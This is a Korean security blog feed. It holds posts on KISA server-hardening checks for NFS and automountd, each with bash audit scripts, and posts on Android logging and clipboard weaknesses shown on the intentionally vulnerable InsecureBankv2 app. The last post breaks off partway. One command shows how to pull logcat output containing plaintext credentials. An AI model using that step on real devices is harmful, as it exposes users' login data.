    <url>/2022/01/10/2022-01-10-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-24%20NFS%20%EC%84%9C%EB%B9%84%EC%8A%A4%20%EB%B9%84%ED%99%9C%EC%84%B1%ED%99%94/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>불필요한 NFS 서비스 사용여부를 점검합니다.</p>
<p>항목코드는 <code>U-24</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="NFS"><a href="#NFS" class="headerlink" title="NFS?"></a>NFS?</h2><br>

<p>Network File System의 약자로 네트워크상에서 파일시스템을 공유하도록 설계된 파일 시스템입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>한 서버의 파일을 많은 서비스 서버들이 공유하여 사용할 때 많이 이용되는 서비스이지만 이를 이용한 침해사고 위험성이 높으므로 사용하지 않는 경우 중지해야합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>서버의 디스크를 클라이언트와 공유하는 서비스로 적정한 보안설정이 적용되어 있지 않다면 불필요한 파일 공유로 인한 유출위험이 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.102</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX<br />HP-UX,<br />SOLARIS 5.9<br />이하 버전</td>
<td>NFS 서비스 데몬 확인<br /><code># ps -ef | egrep &quot;nfs|statd|lockd&quot;</code><br /></td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td><code># inetadm | egrep &quot;nfs|statd|lockd&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="취약한-서비스-활성화-여부-확인"><a href="#취약한-서비스-활성화-여부-확인" class="headerlink" title="취약한 서비스 활성화 여부 확인"></a>취약한 서비스 활성화 여부 확인</h2><br>

<blockquote>
<p># ps -ef | egrep &quot;nfs|statd|lockd&quot;</p>
</blockquote>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-24/grep.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>조치 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX,<br />SOLARIS 5.9<br />이하 버전</td>
<td>1) NFS 서비스 데몬 중지<br />    <code># kill -9 [PID]</code><br /><br />2) 시동 스크립트 삭제 또는 스크립트 이름 변경<br />    - 위치확인<br />        <code># ls -al /etc/rc.d/rc*.d/* | grep nfs</code><br />    - 이름변경<br />        <code># mv /etc/rc.d/rc2.d/S60nfs /etc/rc.d/rc2.d/_S60nfs</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td>1) NFS 서비스 데몬 중지<br />    <code># kill -9 [PID]</code><br /><br />2) <code>/etc/rc.config.d/nfsconf</code> 파일 설정 수정<br />    <code># vi /etc/rc.config.d/nfsconf</code><br />    (수정 전) NFS_SERVER=1<br />    (수정 후) NFS_SERVER=0</td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td>1) NFS 서비스 데몬 확인<br />    <code>svc:/network/nfs/server:default</code><br /><br />2) inetadm -d &quot;중지하고자 하는 데몬&quot; 명령으로 서비스 데몬 중지<br />    <code># inetadm -d svc:/network/nfs/server:default</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`ps -ef | egrep <span class="string">&quot;nfs|statd|lockd&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *nfsd* ]] || [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *statd* ]] || [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *lockd* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-24 [NFS 서비스 비활성화] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-24.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>nfsd</code> <code>statd</code> <code>lockd</code> 프로세스가 활성화 상태인지 확인합니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-24</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-24/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 안전하지 않은 로깅 메커니즘</title>
    <url>/2022/01/10/2022-01-10-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EC%95%88%EC%A0%84%ED%95%98%EC%A7%80%20%EC%95%8A%EC%9D%80%20%EB%A1%9C%EA%B9%85%20%EB%A9%94%EC%BB%A4%EB%8B%88%EC%A6%98/</url>
    <content><![CDATA[<h1 id="🤔-안전하지-않은-로깅-메커니즘"><a href="#🤔-안전하지-않은-로깅-메커니즘" class="headerlink" title="🤔  안전하지 않은 로깅 메커니즘?"></a>🤔  안전하지 않은 로깅 메커니즘?</h1><br>

<p>민감한 정보를 로그에 남길 경우에 발생하는 취약점입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<p>커널 안에 있는 로거라는 커널 드라이브는 <code>main</code> <code>radio</code> <code>event</code> <code>system</code> 총 4가지의 버퍼를 관리하고 있습니다.</p>
<p>사용자 공간안에 있는 애플리케이션들은 보안 정책에 의해 버퍼에 접근할 수 없습니다.</p>
<p>대신에 <code>/dev</code>라는 디렉터리에 리눅스 디바이스 노드들을 제공하여 애플리케이션이 로그를 읽고 쓸 수 있도록 하고있습니다.</p>
<br>

<table>
<thead>
<tr>
<th>버퍼</th>
<th>설명</th>
</tr>
</thead>
<tbody><tr>
<td>Main</td>
<td>메인 앱로그로 앱이나 플랫폼 내부에서 <code>android.util.Log</code> 클래스로 기록된 로그</td>
</tr>
<tr>
<td>Event</td>
<td>시스템에서 발생하는 이벤트 정보를 위한 로그</td>
</tr>
<tr>
<td>Radio</td>
<td>이동통신망과 관련된 이벤트 정보를 위한 로그</td>
</tr>
<tr>
<td>System</td>
<td>안드로이드 플랫폼 내부의 하위 레벨에 있는 시스템이나 디버깅을 위한 로그</td>
</tr>
</tbody></table>
<br>

<br>

<p>로그에는 5개의 static 메서드가 있고 등급이 있습니다.</p>
<br>

<table>
<thead>
<tr>
<th>등급</th>
<th>설명</th>
</tr>
</thead>
<tbody><tr>
<td>V (Verbose)</td>
<td>별로 중요하지 않은 정보</td>
</tr>
<tr>
<td>I (Info)</td>
<td>일반 정보</td>
</tr>
<tr>
<td>D (Debug)</td>
<td>디버그 관련 정보</td>
</tr>
<tr>
<td>W (Warning)</td>
<td>경고 로그 정보</td>
</tr>
<tr>
<td>E (Error)</td>
<td>에러 로그</td>
</tr>
<tr>
<td>F (Fatal)</td>
<td>중요한 정보</td>
</tr>
<tr>
<td>S (Slinet)</td>
<td>가장 높은 우선순위로 다른 로그들은 출력이 안됨</td>
</tr>
</tbody></table>
<br>

<p>이러한 등급을 지정하여 특정한 등급만 모아서 출력시킬 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<h2 id="로그-확인"><a href="#로그-확인" class="headerlink" title="로그 확인"></a>로그 확인</h2><br>

<blockquote>
<p># logcat</p>
</blockquote>
<br>

<p><code>adb</code>에서 <code>logcat</code> 명령어를 사용하여 로그를 확인할 수 있습니다.</p>
<p>인시큐어뱅크 애플리케이션에서 로그인 했을 때 아이디/비밀번호가 평문으로 로그에 남았습니다.</p>
<br>

<img src="/images/Android/안전하지 않은 로깅 메커니즘/logcat.png">

<br>

<br>

<h2 id="로컬로-로그-정보-가져오기"><a href="#로컬로-로그-정보-가져오기" class="headerlink" title="로컬로 로그 정보 가져오기"></a>로컬로 로그 정보 가져오기</h2><br>

<blockquote>
<p>adb -e shell logcat&gt;log.txt</p>
</blockquote>
<br>

<p>만약 공격자가 디바이스에 접근 권한을 얻었다고 가정한다면 이러한 로그들을 쉽게 추출할 수 있습니다.</p>
<br>

<img src="/images/Android/안전하지 않은 로깅 메커니즘/log.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p>애플리케이션을 개발할 때 민감한 정보 등을 로그로 발생시키지 않으면 됩니다.</p>
<br>

<h2 id="DoLogin-java"><a href="#DoLogin-java" class="headerlink" title="DoLogin.java"></a>DoLogin.java</h2><br>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* DoLogin.java 일부 */</span></span><br><span class="line"></span><br><span class="line">InputStream in = responseBody.getEntity().getContent();</span><br><span class="line">result = convertStreamToString( in );</span><br><span class="line">result = result.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (result != <span class="keyword">null</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (result.indexOf(<span class="string">&quot;Correct Credentials&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="comment">//Log.d(&quot;Successful Login:&quot;, &quot;, account=&quot; + username + &quot;:&quot; + password);</span></span><br><span class="line">		saveCreds(username, password);</span><br><span class="line">		trackUserLogins();</span><br><span class="line">		Intent pL = <span class="keyword">new</span> Intent(getApplicationContext(), PostLogin.class);</span><br><span class="line">		pL.putExtra(<span class="string">&quot;uname&quot;</span>, username);</span><br><span class="line">		startActivity(pL);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			Intent xi = <span class="keyword">new</span> Intent(getApplicationContext(), WrongLogin.class);</span><br><span class="line">			startActivity(xi);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<p><code>DoLogin.java</code> 소스코드 일부분입니다.</p>
<p>8 번째 줄을 보면 아이디와 비밀번호를 로그로 남기고 있습니다.</p>
<p>해당 줄을 주석처리 했습니다.</p>
<br>

<br>

<h2 id="주석처리-후-로그인"><a href="#주석처리-후-로그인" class="headerlink" title="주석처리 후 로그인"></a>주석처리 후 로그인</h2><br>

<p>해당 코드를 주석처리 해주니 로그가 안남았습니다.</p>
<br>

<img src="/images/Android/안전하지 않은 로깅 메커니즘/logcat_2.png">

<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-25 NFS 접근 통제</title>
    <url>/2022/01/10/2022-01-10-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-25%20NFS%20%EC%A0%91%EA%B7%BC%20%ED%86%B5%EC%A0%9C/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>NFS 서비스 사용 시 허가된 사용자만 접근할 수 있도록 접근통제를 해주어야합니다.</p>
<p>항목코드는 <code>U-25</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="NFS"><a href="#NFS" class="headerlink" title="NFS?"></a>NFS?</h2><br>

<p>Network File System의 약자로 네트워크상에서 파일시스템을 공유하도록 설계된 파일 시스템입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>접근권한이 없는 비인가자의 접근을 통제함으로써 정보 유출의 위험을 줄입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>접근제한 설정이 적절하지 않을 경우 인증절차 없이 비인가자가 디렉터리나 파일의 접근이 가능하며 해당 공유 시스템에 원격으로 마운트하여 중요 파일을 변조하거나 유출할 위험이 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.102</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 불필요한 NFS 서비스를 사용하지 않거나, 불가피하게 사용 시 everyone 공유를 제한한 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 불필요한 NFS 서비스를 사용하고 있고, everyone 공유를 제한하지 않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />HP-UX</td>
<td><code>/etc/dfs/dfstab</code> <code>/etc/dfs/sharetab</code> 파일</td>
</tr>
<tr>
<td>LINUX, AIX,<br />HP-UX</td>
<td><code>/etc/exports</code> 파일</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>파일</th>
<th>조치 방법</th>
</tr>
</thead>
<tbody><tr>
<td><code>/etc/dfs/dfstab</code> 파일</td>
<td><code>rw=client</code>, <code>ro=client</code> 형식으로 접속 허용 client 지정<br />    - 사용자의 읽기, 쓰기 권한 접속 허용 : <code>share -F nfs -o rw, ro /export/home/test</code><br />    - 사용자의 권한 접속 제한 : <code>share -F nfs -o rw=client1:client2, ro=client1:client2 /export/home/test</code><br /><br />* 읽기, 쓰기 권한에 각각 사용자를 설정하여야 읽기, 쓰기 권한 모두 제한 가능</td>
</tr>
<tr>
<td><code>/etc/exports</code> 파일</td>
<td>1) <code>/etc/exports</code> 파일에 접근 가능한 호스트명 추가<br />    예) <code>/stand host1(또는 IP주소) host2</code><br /><br />2) 접속시 인증 및 클라이언트 권한 nobody 설정<br />    <code># vi /etc/exports</code><br />    <code># /stand host1 (root_squash)</code><br />        * () 옵션에 인증되지 않은 엑세스를 허용하는 &quot;insecure&quot; 구문 설정 금지<br /><br />3) NFS 서비스 재구동<br />    <code># /etc/exportfs -u</code><br />    <code># /etc/exportfs -a</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">process=`ps -ef | egrep <span class="string">&quot;nfs|statd|lockd&quot;</span>`</span><br><span class="line">exports=`cat /etc/exports`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *nfsd* ]] || [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *statd* ]] || [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *lockd* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$exports</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                ProcessResult=양호</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                ProcessResult=취약</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-25 [NFS 접근 통제] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-25.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>nfsd</code> <code>statd</code> <code>lockd</code> 프로세스가 활성화 상태인지 확인합니다.</p>
<p>프로세스가 활성화 상태이면 <code>/etc/exports</code> 파일에 내용이 있는지 확인하고, 내용이 있으면 <code>양호</code>처리 없으면 <code>취약</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-25</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-25/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-26 automountd 제거</title>
    <url>/2022/01/10/2022-01-10-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-26%20automountd%20%EC%A0%9C%EA%B1%B0/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>automountd</code> 서비스 데몬의 실행 여부 점검입니다.</p>
<p>항목코드는 <code>U-26</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="automountd"><a href="#automountd" class="headerlink" title="automountd?"></a>automountd?</h2><br>

<p>클라이언트가 서버에서 공유한 자원을 사용하려고 할 때 <code>mount</code>란 명령을 사용하지 않아도 자동적으로 <code>mount</code>되고 일정 시간 사용하지 않으면 자동으로 <code>unmount</code>됩니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>로컬 공격자가 <code>automountd</code> 데몬에 RPC(Remote Procedure Call)를 보낼 수 있는 취약점이 존재하기 때문에 해당 서비스가 실행중일 경우 서비스를 중지해야합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>파일 시스템의 마운트 옵션을 변경하여 root 권한을 획득할 수 있으며, 로컬 공격자가 <code>automountd</code> 프로세스 권한으로 임의의 명령을 실행할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.102</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>automountd</code> 서비스가 비활성화 되어 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>automountd</code> 서비스가 활성화 되어 있는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX,<br />HP-UX,<br />SOLARIS 5.9<br />이하 버전</td>
<td><code>automountd</code> 서비스 데몬 확인 (automountd 동작 SID 확인)<br />    <code># ps -ef | grep automount</code> (or autofs)</td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td><code>automount</code> 서비스 데몬 확인<br />    <code># svcs -a | grep &quot;autofs&quot;</code></td>
</tr>
</tbody></table>
<br>

<p><code>automount</code> 서비스가 활성화되어 있습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-26/ps.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>파일</th>
<th>조치 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX,<br />SOLARIS 5.9<br />이하 버전</td>
<td>1) <code>automountd</code> 서비스 데몬 중지<br />    <code># kill -9 [PID]</code><br /><br />2) 시동 스크립트 삭제 또는 스크립트 이름 변경<br />    - 위치 확인<br />        <code># ls -al /etc/rc.d/rc*.d/* | grep automount</code> (or autofs)<br />    - 이름 변경<br />        <code># mv /etc/rc.d/rc2.d/S28automountd /etc/rc.d/rc2.d/_S28automountd</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td>1) <code>automount</code> 서비스 데몬 중지<br />    <code># kill -9 [PID]</code><br /><br />2) <code>/etc/rc.config.d/nfsconf</code> 파일 설정 수정<br />    <code># vi /etc/rc.config.d/nfsconf</code><br />    (수정 전) <code>AUTOFS=1</code><br />    (수정 후) <code>AUTOFS=0</code></td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td>1) <code>autofs</code> 서비스 데몬 확인<br />    <code>svc:/system/filesystem/autofs:default</code><br /><br />2) <code>svcadm disable &quot;중지하고자 하는 데몬&quot;</code> 명령으로 서비스 데몬 중지<br />    <code># svcadm disable svc:/system/filesystem/autofs:default</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`ps -ef | grep automount`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-26 [automountd 제거] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-26.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>automount</code> 프로세스가 활성화 상태인지 확인합니다.</p>
<p>프로세스가 활성화 상태이면 <code>취약</code>, 없으면 <code>양호</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-26</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-26/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 안드로이드 키보드 캐시 이슈</title>
    <url>/2022/01/11/2022-01-11-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%ED%82%A4%EB%B3%B4%EB%93%9C%20%EC%BA%90%EC%8B%9C%20%EC%9D%B4%EC%8A%88/</url>
    <content><![CDATA[<h1 id="🤔-안드로이드-키보드-캐시-이슈"><a href="#🤔-안드로이드-키보드-캐시-이슈" class="headerlink" title="🤔  안드로이드 키보드 캐시 이슈?"></a>🤔  안드로이드 키보드 캐시 이슈?</h1><br>

<p>사용자가 클립보드에 중요 정보를 저장하면 해당 정보를 제3자가 획득할 수 있는 취약점입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<p><code>키보드 캐시</code>는 안드로이드의 TextView와 같이 컴포넌트에서 사용자가 중요 정보를 클립보드에 복사할 수 있을 때 임시로 복사한 데이터를 저장하는 곳입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<h2 id="정보-복사"><a href="#정보-복사" class="headerlink" title="정보 복사"></a>정보 복사</h2><br>

<p>인시큐어뱅크 애플리케이션에서 데이터를 복사했습니다</p>
<br>

<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="/images/Android/안드로이드 키보드 캐시 이슈/jack.png"></div><div class="group-picture-column"><img src="/images/Android/안드로이드 키보드 캐시 이슈/account.png"></div></div></div>

<br>

<br>

<h2 id="저장된-데이터에-접근"><a href="#저장된-데이터에-접근" class="headerlink" title="저장된 데이터에 접근"></a>저장된 데이터에 접근</h2><br>

<p><code>clipper</code>이라는 애플리케이션에서 클립보드에 저장된 데이터를 아무런 권한 없이 접근이 가능하다는 것을 볼 수 있습니다.</p>
